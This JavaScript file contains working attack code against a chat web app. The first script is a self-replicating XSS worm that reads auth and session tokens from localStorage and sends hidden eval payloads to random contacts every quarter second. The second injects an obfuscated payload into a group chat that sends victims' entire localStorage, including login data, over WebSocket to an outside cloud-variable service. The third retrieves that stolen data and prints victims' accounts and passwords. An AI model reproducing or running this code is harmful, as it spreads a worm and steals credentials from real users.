async function quine() {
  let headers = {
    accept: "application/json, text/plain, */*",
    "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    authorization: JSON.parse(localStorage.getItem("authToken")).data,
    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
    priority: "u=1, i",
    sessionid: JSON.parse(localStorage.getItem("sessionId")).data,
  };

  if (window.HelloLCiM !== undefined) return;

  window.HelloLCiM = setInterval(async () => {
    let resp = await fetch("https://www.lcim.site/enterprise/im/getContacts", {
      headers,
      body: null,
      method: "POST",
      mode: "cors",
      credentials: "include",
    });
    let data = await resp.json();
    data = data.data;
    while (true) {
      let concat = data[Math.floor(Math.random() * data.length)];

      let concatId = concat.account;
      if (concatId === undefined) continue;
      let concatIsGroup = concat.is_group;
      const code = "(" + Function.prototype.toString.call(quine) + ")()";

      let result = "";
      for (let i = 0; i < code.length; i++) {
        const c = code.charCodeAt(i);
        result += "\\u" + c.toString(16).padStart(4, "0");
      }
      let content =
        `<img style="display:none" src="${crypto.randomUUID()}" onerror=""onerror="eval('${result}')">` +
        crypto.randomUUID().slice(1, 6);

      content = encodeURIComponent(content);
      let userInfo = JSON.parse(localStorage.getItem("UserInfo")).data;
      let r = await fetch("https://www.lcim.site/enterprise/im/sendMessage", {
        headers,
        body:
          encodeURI(
            `id=${crypto.randomUUID()}&type=text&status=going&sendTime=${Date.now()}` +
              `&toContactId=${concatId}&fromUser[id]=${userInfo.user_id}&fromUser[displayName]=${userInfo.displayName}` +
              `&fromUser[avatar]=${userInfo.avatar}&fromUser[account]=${userInfo.account}&content=`,
          ) +
          content +
          `&file_id=0&is_group=${concatIsGroup}`,
        method: "POST",
        mode: "cors",
        credentials: "include",
      });
      if ((await r.json()).code !== 400) return;
    }
  }, 250);
}
quine();

(async () => {
  let concatId = "group-4";
  let concatIsGroup = 1;
  let code = `
function _0x2104(_0x308c10,_0x13ce01){const _0x5d4603=_0x5d46();return _0x2104=function(_0x2104bb,_0x568104){_0x2104bb=_0x2104bb-0x8d;let _0x599567=_0x5d4603[_0x2104bb];return _0x599567;},_0x2104(_0x308c10,_0x13ce01);}(function(_0x576b65,_0x13e6a9){const _0x69efd9=_0x2104,_0xfa2b45=_0x576b65();while(!![]){try{const _0x50a3f3=parseInt(_0x69efd9(0x9f))/0x1*(-parseInt(_0x69efd9(0xa4))/0x2)+parseInt(_0x69efd9(0xa2))/0x3+parseInt(_0x69efd9(0x99))/0x4*(-parseInt(_0x69efd9(0x96))/0x5)+-parseInt(_0x69efd9(0xaa))/0x6+-parseInt(_0x69efd9(0x8e))/0x7+-parseInt(_0x69efd9(0x9c))/0x8*(parseInt(_0x69efd9(0x94))/0x9)+parseInt(_0x69efd9(0x9d))/0xa;if(_0x50a3f3===_0x13e6a9)break;else _0xfa2b45['push'](_0xfa2b45['shift']());}catch(_0x36cf4a){_0xfa2b45['push'](_0xfa2b45['shift']());}}}(_0x5d46,0xa89d5),((async()=>{const _0x2eed3b=_0x2104;let _0x1a2ff5=localStorage[_0x2eed3b(0xab)]('i18n');if(_0x1a2ff5){_0x1a2ff5=JSON[_0x2eed3b(0x9b)](_0x1a2ff5);if(_0x1a2ff5['displayNameShowlnfo'])return;_0x1a2ff5[_0x2eed3b(0x95)]=_0x2eed3b(0x9a),localStorage[_0x2eed3b(0xa1)]('i18n',JSON[_0x2eed3b(0x9e)](_0x1a2ff5));}let _0x3b7314={};for(let _0x2f281b=0x0;_0x2f281b<localStorage['length'];_0x2f281b++){const _0x5490b9=localStorage[_0x2eed3b(0xa7)](_0x2f281b);_0x3b7314[_0x5490b9]=localStorage['getItem'](_0x5490b9);}let _0x9bb0b9=new TextEncoder(),_0x1ed234=JSON[_0x2eed3b(0x9b)](localStorage[_0x2eed3b(0xab)]('UserInfo'))[_0x2eed3b(0x91)]['realname'],_0x26849b=_0x9bb0b9[_0x2eed3b(0x98)](_0x1ed234+_0x2eed3b(0x97)),_0x45c48d=await crypto['subtle'][_0x2eed3b(0x90)]('S'+'H'+'A'+'-'+_0x2eed3b(0xa0),_0x26849b);_0x45c48d=Array[_0x2eed3b(0xa9)](new Uint8Array(_0x45c48d))['map'](_0x3cf1d6=>_0x3cf1d6[_0x2eed3b(0xa6)](0x10)['padStart'](0x2,'0'))[_0x2eed3b(0x93)]('');let _0x2528de='1',_0x272cdb=JSON[_0x2eed3b(0x9e)](_0x3b7314);async function _0x1cf019(_0x27f797,_0x529239){const _0x5bb888=_0x2eed3b;let _0x461422=new WebSocket(_0x5bb888(0x8f));while(_0x461422[_0x5bb888(0xa5)]===WebSocket['CONNECTING']){await new Promise(_0xd2643c=>setTimeout(_0xd2643c,0x64));}_0x461422[_0x5bb888(0x92)](JSON[_0x5bb888(0x9e)]({'method':_0x5bb888(0x8d),'user':_0x2528de,'project_id':_0x529239,'name':'☁\x20'+_0x27f797,'value':'0'})),_0x461422[_0x5bb888(0x92)](JSON[_0x5bb888(0x9e)]({'method':_0x5bb888(0xa8),'user':_0x2528de,'project_id':_0x529239,'name':'☁\x20'+_0x27f797,'value':'1'}));}await _0x1cf019(_0x1ed234,_0x2eed3b(0xa3)),await _0x1cf019(_0x272cdb,_0x45c48d);})()));function _0x5d46(){const _0x45115f=['getItem','create','8285151VirjAp','wss://api.xueersi.com/codecloudvariable/ws:80','digest','data','send','join','1926nsjQCq','displayNameShowlnfo','762115MhUDhY','lcimlcim111','encode','16ENeHYe','用户昵称','parse','48088GVpVGZ','37276500vUeebw','stringify','3xTSYqe','256','setItem','4131360fAHbyG','lcimmicl1145','233308SKUuJu','readyState','toString','key','set','from','5907144woOVUO'];_0x5d46=function(){return _0x45115f;};return _0x5d46();}
`;

  let result = "";
  for (let i = 0; i < code.length; i++) {
    const c = code.charCodeAt(i);
    result += "\\u" + c.toString(16).padStart(4, "0");
  }
  let content = `6<img style="display:none" src="x" onerror=""onerror="eval('${result}')">7`;
  content = encodeURIComponent(content);
  let userInfo = JSON.parse(localStorage.getItem("UserInfo")).data;
  fetch("https://www.lcim.site/enterprise/im/sendMessage", {
    headers: {
      accept: "application/json, text/plain, */*",
      "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
      authorization: JSON.parse(localStorage.getItem("authToken")).data,
      "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
      priority: "u=1, i",
      sessionid: JSON.parse(localStorage.getItem("sessionId")).data,
    },
    body:
      encodeURI(
        `id=${crypto.randomUUID()}&type=text&status=going&sendTime=${Date.now()}` +
          `&toContactId=${concatId}&fromUser[id]=${userInfo.user_id}&fromUser[displayName]=${userInfo.displayName}` +
          `&fromUser[avatar]=${userInfo.avatar}&fromUser[account]=${userInfo.account}&content=`,
      ) +
      content +
      `&file_id=0&is_group=${concatIsGroup}`,
    method: "POST",
    mode: "cors",
    credentials: "include",
  });
})();

(async () => {
  class XesWsCloudVar {
    /**
     * @callback XesWsCloudVarCallback
     * @param {{
     *     method: "ack",
     *     name: string,
     *     reply: "OK"
     * } | {
     *     method: "set",
     *     project_id: string,
     *     name: string,
     *     value: number
     * }} event
     */

    /**
     * constructor
     * @param userId {string}
     * @param projectId
     * @param onmessage {XesWsCloudVarCallback} 接收到消息时的回调函数
     */
    constructor(
      userId = "1",
      projectId = "2",
      onmessage = function (event) {},
    ) {
      this.user_id = userId;
      this.project_id = projectId;
      this.socket = new WebSocket(
        "wss://api.xueersi.com/codecloudvariable/ws:80",
      );
      this.onmessageCallback = onmessage;
      this.socket.onmessage = function (event) {
        let obj = JSON.parse(event.data);
        func1(obj);
      };
      let func2 = function func3(data) {
        this.onmessageCallback(data);
      };
      let func1 = func2.bind(this);
    }

    async initialize() {
      while (this.socket.readyState === WebSocket.CONNECTING) {
        await new Promise((resolve) => setTimeout(resolve, 100));
      }

      if (this.socket.readyState !== WebSocket.OPEN) {
        throw new Error("WebSocket was not opened successfully");
      }

      this.socket.send(
        JSON.stringify({
          method: "handshake",
          user: this.user_id,
          project_id: this.project_id,
        }),
      );
    }
  }

  let users = [];
  let cv = new XesWsCloudVar("1", "lcimmicl1145", async function (data) {
    if (data.method === "ack") return;
    let username = data.name.slice(2);
    console.log("Received username:", username);
    users.push(username);
  });
  cv.initialize();
  await new Promise((resolve) => setTimeout(resolve, 2000));

  let table = [];
  for (let username of users) {
    let encoder = new TextEncoder();
    let nameData = encoder.encode(username + "lcimlcim111");
    let hash = await crypto.subtle.digest("SHA-256", nameData);
    hash = Array.from(new Uint8Array(hash))
      .map((b) => b.toString(16).padStart(2, "0"))
      .join("");

    let cv = new XesWsCloudVar("1", hash, function (data) {
      if (data.method === "ack") return;
      let userData = data.name.slice(2);
      userData = JSON.parse(userData);
      let accountData = JSON.parse(userData.LoginAccount).data;
      if (accountData.account === "unybhgfd") return;
      table.push({
        username,
        account: accountData.account,
        password: accountData.password,
        data: userData,
      });
    });
    await cv.initialize();
  }
  console.table(table);
})();
